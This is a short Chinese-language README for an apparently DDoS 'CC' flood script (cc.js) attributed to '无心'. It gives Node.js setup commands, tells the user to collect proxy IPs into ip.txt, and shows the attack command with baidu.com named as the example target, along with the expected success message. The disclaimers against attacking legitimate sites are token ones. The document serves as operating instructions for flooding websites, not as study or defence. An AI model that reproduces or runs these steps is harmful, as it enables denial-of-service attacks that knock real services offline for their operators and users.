# 无心反射攻击脚本


#### 软件架构
软件架构说明
1. 脚本更新了修复了完整代码

2. 脚本运行环境为Linux环境

3. 请勿贩卖本脚本用来其他活动


#### 安装教程

1.  服务器安装Linux系统
2.  Linux执行安装js环境
3.  这下面是为js安装指令

yum install wget
wget https://nodejs.org/dist/v10.15.3/node-v10.15.3-linux-x64.tar.xz
tar xvJf node-v10.15.3-linux-x64.tar.xz
mv node-v10.15.3-linux-x64 /usr/local/node-v10
ln -s /usr/local/node-v10/bin/node /bin/node
ln -s /usr/local/node-v10/bin/npm /bin/npm
echo 'export PATH=/usr/local/node-v10/bin:$PATH' >> /etc/profile
source /etc/profile
npm install forever -g

4. 采集代理IP保存为ip.txt


#### 使用说明

1.  攻击指令

node cc.js [主机] [时间] [代理.txt]

事例指令:

node cc.js http://baidu.com 300 ip.txt

3.  攻击成功会显示以下

GET Test has been sent to http://baidu.com for 300seconds


####其他说明
1. 脚本来源于网络搜集
2. 禁止攻击其正规网站
3. 作者不承担任何责任

#### 参与贡献

1.  无心   邮箱2497290435.com


－－－－－－红十字国际网安－无心



